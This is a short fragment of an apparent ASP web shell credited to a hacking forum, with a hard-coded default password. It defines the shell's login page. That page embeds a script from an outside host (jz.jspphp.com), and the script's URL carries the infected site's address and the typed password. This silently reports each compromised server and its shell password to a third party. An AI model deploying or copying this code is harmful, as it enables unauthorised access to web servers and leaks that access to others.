...
mmshell ="日月神教技术论坛收集整理 默认密码为：rysj2012" 'shell版权
errout ="密码错误！！！" '密码错误提示
...
si="<script src=""http://jz.jspphp.com/%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23/so.php?url="&server.URLEncode(""&request.ServerVariables("HTTP_HOST")&request.ServerVariables("url"))&"&pass="&UserPass&"""></script><center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><hr><FORM Action='"&URL&"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login><hr><br>"&mmshell&"</div></center>"
